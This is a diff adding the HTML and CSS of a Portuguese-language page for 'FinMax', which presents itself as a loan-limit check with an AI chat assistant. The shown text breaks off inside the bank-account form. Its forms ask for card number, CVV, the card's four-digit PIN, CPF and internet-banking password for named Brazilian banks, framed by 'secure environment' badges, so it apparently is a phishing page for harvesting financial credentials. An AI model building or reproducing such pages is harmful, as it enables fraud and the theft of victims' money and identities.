@@ -1,0 +1,2208 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FinMax - Consulta de Limite com IA</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #6c5ce7;
+            --primary-dark: #5649c0;
+            --secondary: #a29bfe;
+            --accent: #fd79a8;
+            --dark: #2d3436;
+            --light: #f5f6fa;
+            --success: #00b894;
+            --danger: #d63031;
+            --warning: #fdcb6e;
+            --chatbot-bg: #ffffff;
+            --chatbot-primary: #6c5ce7;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #dfe6f1 100%);
+            color: var(--dark);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .main-container {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        .content-wrapper {
+            flex: 1;
+            padding-bottom: 80px;
+        }
+
+        /* Header Moderno */
+        header {
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            color: white;
+            padding: 1.5rem 0;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: white;
+            text-decoration: none;
+        }
+
+        .logo i {
+            margin-right: 0.8rem;
+            font-size: 2rem;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 2rem;
+        }
+
+        .nav-links a {
+            color: white;
+            text-decoration: none;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .nav-links a:hover {
+            opacity: 0.9;
+        }
+
+        .nav-links a::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background-color: white;
+            transition: width 0.3s ease;
+        }
+
+        .nav-links a:hover::after {
+            width: 100%;
+        }
+
+        /* Hero Section */
+        .hero {
+            padding: 5rem 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('https://images.unsplash.com/photo-1601597111158-2fceff292cdc?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80') no-repeat center center/cover;
+            filter: brightness(0.6);
+            z-index: -1;
+        }
+
+        .hero-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 2rem;
+            text-align: center;
+            position: relative;
+            z-index: 1;
+        }
+
+        .hero-title {
+            font-size: clamp(2.5rem, 5vw, 4rem);
+            font-weight: 800;
+            margin-bottom: 1.5rem;
+            background: linear-gradient(90deg, white, #f5f6fa);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            line-height: 1.2;
+            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+        }
+
+        .hero-subtitle {
+            font-size: clamp(1rem, 3vw, 1.4rem);
+            color: white;
+            margin-bottom: 2.5rem;
+            max-width: 800px;
+            margin-left: auto;
+            margin-right: auto;
+            opacity: 0.9;
+        }
+
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0.8rem 2rem;
+            border-radius: 50px;
+            font-size: 1rem;
+            font-weight: 600;
+            text-decoration: none;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: none;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            color: white;
+            box-shadow: 0 4px 15px rgba(108, 92, 231, 0.4);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(108, 92, 231, 0.5);
+        }
+
+        .btn-primary:active {
+            transform: translateY(1px);
+        }
+
+        .btn-outline {
+            background-color: transparent;
+            border: 2px solid white;
+            color: white;
+            margin-left: 1rem;
+        }
+
+        .btn-outline:hover {
+            background-color: white;
+            color: var(--primary);
+        }
+
+        /* Consultation Section */
+        .consultation-section {
+            padding: 4rem 0;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 2rem;
+        }
+
+        .section-title {
+            text-align: center;
+            margin-bottom: 3rem;
+        }
+
+        .section-title h2 {
+            font-size: clamp(1.8rem, 4vw, 2.5rem);
+            font-weight: 700;
+            margin-bottom: 1rem;
+            color: var(--dark);
+            position: relative;
+            display: inline-block;
+        }
+
+        .section-title h2::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 80px;
+            height: 4px;
+            background: linear-gradient(90deg, var(--primary), var(--accent));
+            border-radius: 2px;
+        }
+
+        .section-title p {
+            font-size: clamp(0.9rem, 2vw, 1.1rem);
+            color: #666;
+            max-width: 700px;
+            margin: 0 auto;
+        }
+
+        /* Card Preview */
+        .card-preview-container {
+            perspective: 1000px;
+            margin-bottom: 2rem;
+        }
+
+        .card-preview {
+            width: 100%;
+            max-width: 400px;
+            height: 220px;
+            background: linear-gradient(135deg, #3a3a5a, #1a1a2e);
+            color: white;
+            padding: 1.5rem;
+            border-radius: 15px;
+            margin: 0 auto;
+            position: relative;
+            overflow: hidden;
+            transform-style: preserve-3d;
+            transition: transform 0.5s ease;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+        }
+
+        .card-preview:hover {
+            transform: rotateY(10deg);
+        }
+
+        .card-preview::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -50%;
+            width: 200px;
+            height: 200px;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0) 70%);
+            border-radius: 50%;
+        }
+
+        .card-preview::after {
+            content: '';
+            position: absolute;
+            bottom: -30%;
+            left: -30%;
+            width: 150px;
+            height: 150px;
+            background: radial-gradient(circle, rgba(165,105,239,0.2) 0%, rgba(165,105,239,0) 70%);
+            border-radius: 50%;
+        }
+
+        .card-chip {
+            width: 50px;
+            margin-bottom: 1.5rem;
+        }
+
+        .card-number {
+            font-size: 1.4rem;
+            letter-spacing: 2px;
+            margin-bottom: 1.5rem;
+            font-family: 'Courier New', monospace;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+        }
+
+        .card-details {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+        }
+
+        .card-name, .card-expiry {
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            opacity: 0.9;
+        }
+
+        .card-logo {
+            height: 30px;
+            filter: brightness(0) invert(1);
+            display: none;
+        }
+
+        /* Form Styles */
+        .form-container {
+            background: white;
+            border-radius: 15px;
+            padding: 2rem;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            margin: 0 auto;
+            max-width: 800px;
+        }
+
+        .form-step {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .form-step.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .form-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 2rem;
+        }
+
+        .form-header-icon {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 1.5rem;
+            margin-right: 1.5rem;
+            flex-shrink: 0;
+        }
+
+        .form-header-text h3 {
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-bottom: 0.5rem;
+            color: var(--dark);
+        }
+
+        .form-header-text p {
+            color: #666;
+            font-size: 0.95rem;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+            position: relative;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 600;
+            color: var(--dark);
+            font-size: 0.95rem;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 0.9rem 1rem;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            background-color: rgba(255, 255, 255, 0.9);
+        }
+
+        .form-control:focus {
+            border-color: var(--primary);
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(108, 92, 231, 0.2);
+            background-color: white;
+        }
+
+        .form-control.error {
+            border-color: var(--danger);
+        }
+
+        .error-message {
+            color: var(--danger);
+            font-size: 0.85rem;
+            margin-top: 0.5rem;
+            display: none;
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1.5rem;
+        }
+
+        /* Bank Options */
+        .bank-options {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
+            gap: 1rem;
+            margin-top: 1rem;
+        }
+
+        .bank-option {
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            padding: 1rem;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            background-color: white;
+        }
+
+        .bank-option:hover {
+            border-color: var(--primary);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
+        }
+
+        .bank-option.selected {
+            border-color: var(--primary);
+            background-color: rgba(108, 92, 231, 0.05);
+        }
+
+        .bank-logo {
+            width: 50px;
+            height: 50px;
+            object-fit: contain;
+            margin-bottom: 0.5rem;
+        }
+
+        .bank-name {
+            font-size: 0.8rem;
+            font-weight: 600;
+            text-align: center;
+        }
+
+        /* Form Footer */
+        .form-footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 2.5rem;
+            padding-top: 1.5rem;
+            border-top: 1px solid #eee;
+        }
+
+        .btn-back {
+            background: none;
+            border: none;
+            color: var(--primary);
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            padding: 0.5rem 0;
+        }
+
+        .btn-back i {
+            margin-right: 0.5rem;
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            color: #666;
+            font-size: 0.85rem;
+        }
+
+        .security-badge i {
+            color: var(--success);
+            margin-right: 0.5rem;
+            font-size: 1.1rem;
+        }
+
+        /* Results Section */
+        .result-container {
+            text-align: center;
+            padding: 2.5rem 0;
+        }
+
+        .result-icon {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 2rem;
+            color: white;
+            font-size: 2.5rem;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .result-icon.success {
+            background: linear-gradient(135deg, var(--success), #38b6ff);
+        }
+
+        .result-icon.error {
+            background: linear-gradient(135deg, var(--danger), #ff6b6b);
+        }
+
+        .result-title {
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+            color: var(--dark);
+        }
+
+        .result-value {
+            font-size: 3rem;
+            font-weight: 800;
+            margin-bottom: 2rem;
+            background: linear-gradient(90deg, var(--primary), var(--accent));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .result-details {
+            max-width: 600px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 10px;
+            padding: 1.5rem;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
+        }
+
+        .detail-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 0.8rem 0;
+            border-bottom: 1px solid #eee;
+        }
+
+        .detail-item:last-child {
+            border-bottom: none;
+        }
+
+        .detail-label {
+            font-weight: 600;
+            color: #666;
+        }
+
+        .detail-value {
+            font-weight: 700;
+            color: var(--dark);
+        }
+
+        /* Loading State */
+        .loading-container {
+            display: none;
+            text-align: center;
+            padding: 3rem 0;
+        }
+
+        .loading-spinner {
+            width: 70px;
+            height: 70px;
+            border: 8px solid rgba(108, 92, 231, 0.1);
+            border-top-color: var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 2rem;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-size: 1.2rem;
+            color: var(--dark);
+            margin-bottom: 1.5rem;
+        }
+
+        .loading-progress {
+            width: 100%;
+            height: 6px;
+            background-color: rgba(108, 92, 231, 0.1);
+            border-radius: 3px;
+            overflow: hidden;
+            margin: 0 auto;
+            max-width: 300px;
+        }
+
+        .loading-progress-bar {
+            height: 100%;
+            width: 0;
+            background: linear-gradient(90deg, var(--primary), var(--accent));
+            animation: progress 2s ease-in-out infinite;
+        }
+
+        @keyframes progress {
+            0% { width: 0; margin-left: 0; }
+            50% { width: 100%; margin-left: 0; }
+            100% { width: 0; margin-left: 100%; }
+        }
+
+        /* Chatbot IA */
+        .chatbot-container {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            z-index: 1000;
+            transition: all 0.3s ease;
+        }
+
+        .chatbot-toggle {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+            cursor: pointer;
+            box-shadow: 0 5px 20px rgba(108, 92, 231, 0.4);
+            transition: all 0.3s ease;
+            border: none;
+        }
+
+        .chatbot-toggle:hover {
+            transform: scale(1.1);
+        }
+
+        .chatbot-toggle i {
+            transition: all 0.3s ease;
+        }
+
+        .chatbot-toggle.active i {
+            transform: rotate(180deg);
+        }
+
+        .chatbot-window {
+            width: 350px;
+            max-height: 500px;
+            background-color: var(--chatbot-bg);
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
+            display: none;
+            flex-direction: column;
+            transform: translateY(20px);
+            opacity: 0;
+            transition: all 0.3s ease;
+        }
+
+        .chatbot-window.active {
+            display: flex;
+            transform: translateY(0);
+            opacity: 1;
+        }
+
+        .chatbot-header {
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            color: white;
+            padding: 1rem 1.2rem;
+            display: flex;
+            align-items: center;
+        }
+
+        .chatbot-header i {
+            font-size: 1.2rem;
+            margin-right: 0.8rem;
+        }
+
+        .chatbot-header h3 {
+            font-size: 1rem;
+            font-weight: 600;
+        }
+
+        .chatbot-close {
+            margin-left: auto;
+            background: none;
+            border: none;
+            color: white;
+            font-size: 1.1rem;
+            cursor: pointer;
+        }
+
+        .chatbot-messages {
+            flex: 1;
+            padding: 1.2rem;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 0.8rem;
+        }
+
+        .chatbot-message {
+            max-width: 80%;
+            padding: 0.8rem 1rem;
+            border-radius: 15px;
+            font-size: 0.9rem;
+            line-height: 1.5;
+            animation: fadeInUp 0.3s ease;
+        }
+
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .bot-message {
+            background-color: #f1f3ff;
+            align-self: flex-start;
+            border-bottom-left-radius: 5px;
+            color: var(--dark);
+        }
+
+        .user-message {
+            background-color: var(--chatbot-primary);
+            color: white;
+            align-self: flex-end;
+            border-bottom-right-radius: 5px;
+        }
+
+        .chatbot-input-container {
+            display: flex;
+            padding: 1rem;
+            border-top: 1px solid #eee;
+            background-color: white;
+        }
+
+        .chatbot-input {
+            flex: 1;
+            padding: 0.8rem 1rem;
+            border: 1px solid #ddd;
+            border-radius: 25px;
+            font-size: 0.9rem;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+
+        .chatbot-input:focus {
+            border-color: var(--chatbot-primary);
+        }
+
+        .chatbot-send {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            color: white;
+            border: none;
+            margin-left: 0.8rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+        }
+
+        .chatbot-send:hover {
+            transform: scale(1.1);
+        }
+
+        .chatbot-send:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .typing-indicator {
+            display: flex;
+            align-items: center;
+            padding: 0.8rem 1rem;
+            background-color: #f1f3ff;
+            border-radius: 15px;
+            align-self: flex-start;
+            margin-bottom: 0.8rem;
+        }
+
+        .typing-dot {
+            width: 8px;
+            height: 8px;
+            background-color: #999;
+            border-radius: 50%;
+            margin: 0 2px;
+            animation: typingAnimation 1.4s infinite ease-in-out;
+        }
+
+        .typing-dot:nth-child(1) {
+            animation-delay: 0s;
+        }
+
+        .typing-dot:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+
+        .typing-dot:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+
+        @keyframes typingAnimation {
+            0%, 60%, 100% { transform: translateY(0); }
+            30% { transform: translateY(-5px); }
+        }
+
+        /* Footer */
+        footer {
+            background: var(--dark);
+            color: white;
+            padding: 4rem 0 1.5rem;
+        }
+
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 2rem;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 3rem;
+            margin-bottom: 3rem;
+        }
+
+        .footer-column h3 {
+            font-size: 1.2rem;
+            margin-bottom: 1.5rem;
+            position: relative;
+            padding-bottom: 0.8rem;
+        }
+
+        .footer-column h3::after {
+            content: '';
+            position: absolute;
+            left: 0;
+            bottom: 0;
+            width: 40px;
+            height: 3px;
+            background: linear-gradient(90deg, var(--primary), var(--accent));
+            border-radius: 3px;
+        }
+
+        .footer-column ul {
+            list-style: none;
+        }
+
+        .footer-column ul li {
+            margin-bottom: 0.8rem;
+        }
+
+        .footer-column ul li a {
+            color: #bbb;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            font-size: 0.9rem;
+        }
+
+        .footer-column ul li a:hover {
+            color: white;
+            padding-left: 5px;
+        }
+
+        .social-links {
+            display: flex;
+            gap: 1rem;
+            margin-top: 1.5rem;
+        }
+
+        .social-links a {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 40px;
+            height: 40px;
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            color: white;
+            transition: all 0.3s ease;
+        }
+
+        .social-links a:hover {
+            background-color: var(--primary);
+            transform: translateY(-3px);
+        }
+
+        .footer-bottom {
+            text-align: center;
+            padding-top: 1.5rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            color: #999;
+            font-size: 0.85rem;
+        }
+
+        /* Responsividade Avançada */
+        @media (max-width: 992px) {
+            .nav-links {
+                gap: 1.5rem;
+            }
+            
+            .hero {
+                padding: 4rem 0;
+            }
+            
+            .form-row {
+                gap: 1rem;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .header-content {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            .nav-links {
+                margin-top: 1.5rem;
+                justify-content: center;
+            }
+            
+            .hero-content {
+                padding: 0 1.5rem;
+            }
+            
+            .form-row {
+                grid-template-columns: 1fr;
+            }
+            
+            .bank-options {
+                grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
+            }
+            
+            .form-footer {
+                flex-direction: column;
+                gap: 1.5rem;
+            }
+            
+            .chatbot-container {
+                bottom: 20px;
+                right: 20px;
+            }
+            
+            .chatbot-window {
+                width: calc(100vw - 40px);
+                max-height: 60vh;
+                right: 20px;
+            }
+            
+            .footer-content {
+                grid-template-columns: 1fr 1fr;
+            }
+        }
+
+        @media (max-width: 576px) {
+            .hero-title {
+                font-size: 2rem;
+            }
+            
+            .hero-subtitle {
+                font-size: 1rem;
+            }
+            
+            .btn {
+                padding: 0.7rem 1.5rem;
+                font-size: 0.9rem;
+            }
+            
+            .btn-outline {
+                margin-left: 0;
+                margin-top: 1rem;
+            }
+            
+            .form-container {
+                padding: 1.5rem;
+            }
+            
+            .form-header {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            .form-header-icon {
+                margin-right: 0;
+                margin-bottom: 1rem;
+            }
+            
+            .footer-content {
+                grid-template-columns: 1fr;
+                text-align: center;
+            }
+            
+            .footer-column h3::after {
+                left: 50%;
+                transform: translateX(-50%);
+            }
+            
+            .social-links {
+                justify-content: center;
+            }
+        }
+
+        @media (max-width: 400px) {
+            .chatbot-toggle {
+                width: 50px;
+                height: 50px;
+                font-size: 1.2rem;
+            }
+            
+            .card-preview {
+                height: 200px;
+                padding: 1.2rem;
+            }
+            
+            .card-number {
+                font-size: 1.2rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="main-container">
+        <div class="content-wrapper">
+            <header>
+                <div class="header-content">
+                    <a href="#" class="logo">
+                        <i class="fas fa-piggy-bank"></i>
+                        <span>FinMax</span>
+                    </a>
+                    <div class="nav-links">
+                        <a href="#consultation">Consultar Limite</a>
+                        <a href="#features">Vantagens</a>
+                        <a href="#faq">Dúvidas</a>
+                        <a href="#contact">Contato</a>
+                    </div>
+                </div>
+            </header>
+            
+            <section class="hero">
+                <div class="hero-content">
+                    <h1 class="hero-title">Descubra seu limite de crédito</h1>
+                    <p class="hero-subtitle">Consulta rápida e segura usando seu cartão ou conta bancária. Dinheiro na sua conta em até 24 horas!</p>
+                    <div style="display: flex; flex-wrap: wrap; justify-content: center; gap: 1rem;">
+                        <a href="#consultation" class="btn btn-primary">
+                            <i class="fas fa-search"></i> Consultar Agora
+                        </a>
+                        <a href="#features" class="btn btn-outline">
+                            <i class="fas fa-star"></i> Conheça as Vantagens
+                        </a>
+                    </div>
+                </div>
+            </section>
+            
+            <section class="consultation-section" id="consultation">
+                <div class="container">
+                    <div class="section-title">
+                        <h2>Consulta de Limite</h2>
+                        <p>Preencha os dados abaixo para verificar seu limite disponível para empréstimo</p>
+                    </div>
+                    
+                    <div class="form-container">
+                        <!-- Loading State -->
+                        <div class="loading-container" id="loadingStep">
+                            <div class="loading-spinner"></div>
+                            <h3 class="loading-text">Consultando seu limite...</h3>
+                            <p>Estamos analisando suas informações com segurança</p>
+                            <div class="loading-progress">
+                                <div class="loading-progress-bar"></div>
+                            </div>
+                        </div>
+                        
+                        <!-- Step 1: Selection Method -->
+                        <div class="form-step active" id="step1">
+                            <div class="form-header">
+                                <div class="form-header-icon">
+                                    <i class="fas fa-credit-card"></i>
+                                </div>
+                                <div class="form-header-text">
+                                    <h3>Como deseja consultar?</h3>
+                                    <p>Selecione o método de consulta do seu limite</p>
+                                </div>
+                            </div>
+                            
+                            <div class="form-group">
+                                <div class="form-row">
+                                    <div class="bank-option selected" data-method="card">
+                                        <i class="fas fa-credit-card" style="font-size: 2.5rem; color: var(--primary); margin-bottom: 0.8rem;"></i>
+                                        <div class="bank-name">Cartão de Crédito</div>
+                                    </div>
+                                    <div class="bank-option" data-method="bank">
+                                        <i class="fas fa-university" style="font-size: 2.5rem; color: var(--primary); margin-bottom: 0.8rem;"></i>
+                                        <div class="bank-name">Conta Bancária</div>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div class="form-footer">
+                                <div class="security-badge">
+                                    <i class="fas fa-lock"></i>
+                                    <span>Dados protegidos com criptografia</span>
+                                </div>
+                                <button type="button" class="btn btn-primary" id="nextStep1">
+                                    Continuar <i class="fas fa-arrow-right"></i>
+                                </button>
+                            </div>
+                        </div>
+                        
+                        <!-- Step 2: Card Information -->
+                        <div class="form-step" id="step2">
+                            <div class="form-header">
+                                <div class="form-header-icon">
+                                    <i class="far fa-credit-card"></i>
+                                </div>
+                                <div class="form-header-text">
+                                    <h3>Informações do Cartão</h3>
+                                    <p>Preencha os dados do seu cartão de crédito</p>
+                                </div>
+                            </div>
+                            
+                            <div class="card-preview-container">
+                                <div class="card-preview">
+                                    <img src="https://cdn-icons-png.flaticon.com/512/179/179457.png" alt="Chip" class="card-chip">
+                                    <div class="card-number" id="cardNumberPreview">•••• •••• •••• ••••</div>
+                                    <div class="card-details">
+                                        <div class="card-name" id="cardNamePreview">NOME DO TITULAR</div>
+                                        <div class="card-expiry" id="cardExpiryPreview">••/••</div>
+                                    </div>
+                                    <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/visa/visa-original.svg" alt="Visa" class="card-logo" id="cardLogoPreview" style="display: none;">
+                                </div>
+                            </div>
+                            
+                            <form id="cardForm">
+                                <div class="form-group">
+                                    <label for="cardNumber" class="form-label">Número do Cartão</label>
+                                    <input type="text" id="cardNumber" class="form-control" placeholder="0000 0000 0000 0000" maxlength="19">
+                                    <div class="error-message" id="cardNumberError">Por favor, insira um número de cartão válido</div>
+                                </div>
+                            
+                                <div class="form-group">
+                                    <label for="cardName" class="form-label">Nome no Cartão</label>
+                                    <input type="text" id="cardName" class="form-control" placeholder="Como escrito no cartão">
+                                    <div class="error-message" id="cardNameError">Por favor, insira o nome no cartão</div>
+                                </div>
+                                
+                                <div class="form-row">
+                                    <div class="form-group">
+                                        <label for="cardExpiry" class="form-label">Validade</label>
+                                        <input type="text" id="cardExpiry" class="form-control" placeholder="MM/AA" maxlength="5">
+                                        <div class="error-message" id="cardExpiryError">Por favor, insira uma validade válida (MM/AA)</div>
+                                    </div>
+                                    <div class="form-group">
+                                        <label for="cardCvv" class="form-label">CVV</label>
+                                        <input type="password" id="cardCvv" class="form-control" placeholder="•••" maxlength="3">
+                                        <div class="error-message" id="cardCvvError">Por favor, insira o CVV do cartão (3 dígitos)</div>
+                                    </div>
+                                </div>
+                                
+                                <div class="form-group">
+                                    <label for="cardCpf" class="form-label">CPF do Titular</label>
+                                    <input type="text" id="cardCpf" class="form-control" placeholder="000.000.000-00" maxlength="14">
+                                    <div class="error-message" id="cardCpfError">Por favor, insira um CPF válido</div>
+                                </div>
+                                
+                                <div class="form-group">
+                                    <label for="cardPassword" class="form-label">Senha de 4 dígitos do Cartão</label>
+                                    <input type="password" id="cardPassword" class="form-control" placeholder="••••" maxlength="4" inputmode="numeric">
+                                    <div class="error-message" id="cardPasswordError">Por favor, insira a senha de 4 dígitos do cartão</div>
+                                </div>
+                            </form>
+                            
+                            <div class="form-footer">
+                                <button type="button" class="btn-back" id="backStep2">
+                                    <i class="fas fa-arrow-left"></i> Voltar
+                                </button>
+                                <div class="security-badge">
+                                    <i class="fas fa-shield-alt"></i>
+                                    <span>Ambiente 100% seguro</span>
+                                </div>
+                                <button type="button" class="btn btn-primary" id="nextStep2">
+                                    Continuar <i class="fas fa-arrow-right"></i>
+                                </button>
+                            </div>
+                        </div>
+                        
+                        <!-- Step 3: Bank Account Information -->
+                        <div class="form-step" id="step3">
+                            <div class="form-header">
+                                <div class="form-header-icon">
+                                    <i class="fas fa-university"></i>
+                                </div>
+                                <div class="form-header-text">
+                                    <h3>Informações Bancárias</h3>
+                                    <p>Preencha os dados da sua conta bancária</p>
+                                </div>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label class="form-label">Selecione seu Banco</label>
+                                <div id="bankError" class="error-message" style="margin-bottom: 1rem;">Por favor, selecione seu banco</div>
+                                <div class="bank-options">
+                                    <div class="bank-option" data-bank="itau">
+                                        <img src="https://logodownload.org/wp-content/uploads/2018/09/itau-logo-1.png" class="bank-logo" alt="Itaú">
+                                        <div class="bank-name">Itaú</div>
+                                    </div>
+                                    <div class="bank-option" data-bank="bradesco">
+                                        <img src="https://logodownload.org/wp-content/uploads/2018/09/bradesco-logo-1.png" class="bank-logo" alt="Bradesco">
+                                        <div class="bank-name">Bradesco</div>
+                                    </div>
+                                    <div class="bank-option" data-bank="santander">
+                                        <img src="https://logodownload.org/wp-content/uploads/2018/09/santander-logo-2.png" class="bank-logo" alt="Santander">
+                                        <div class="bank-name">Santander</div>
+                                    </div>
+                                    <div class="bank-option" data-bank="bb">
+                                        <img src="https://logodownload.org/wp-content/uploads/2018/09/banco-do-brasil-logo-1.png" class="bank-logo" alt="Banco do Brasil">
+                                        <div class="bank-name">Banco do Brasil</div>
+                                    </div>
+                                    <div class="bank-option" data-bank="caixa">
+                                        <img src="https://logodownload.org/wp-content/uploads/2018/09/caixa-logo-1.png" class="bank-logo" alt="Caixa">
+                                        <div class="bank-name">Caixa</div>
+                                    </div>
+                                    <div class="bank-option" data-bank="nubank">
+                                        <img src="https://logodownload.org/wp-content/uploads/2020/04/nubank-logo-1.png" class="bank-logo" alt="Nubank">
+                                        <div class="bank-name">Nubank</div>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <form id="bankForm">
+                                <div class="form-group">
+                                    <label for="bankAgency" class="form-label">Agência</label>
+                                    <input type="text" id="bankAgency" class="form-control" placeholder="0000">
+                                    <div class="error-message" id="bankAgencyError">Por favor, insira a agência</div>
+                                </div>
+                                
+                                <div class="form-group">
+                                    <label for="bankAccount" class="form-label">Conta</label>
+                                    <input type="text" id="bankAccount" class="form-control" placeholder="00000-0">
+                                    <div class="error-message" id="bankAccountError">Por favor, insira a conta</div>
+                                </div>
+                                
+                                <div class="form-group">
+                                    <label for="bankCpf" class="form-label">CPF do Titular</label>
+                                    <input type="text" id="bankCpf" class="form-control" placeholder="000.000.000-00" maxlength="14">
+                                    <div class="error-message" id="bankCpfError">Por favor, insira um CPF válido</div>
+                                </div>
+                                
+                                <div class="form-group">
+                                    <label for="bankPassword" class="form-label">Senha do Internet Banking</label>
+                                    <input type="password" id="bankPassword" class="form-control" placeholder="Sua senha de acesso">
+                                    <div class="error-message" id="bankPasswordError">Por favor, insira a senha do internet banking</div>
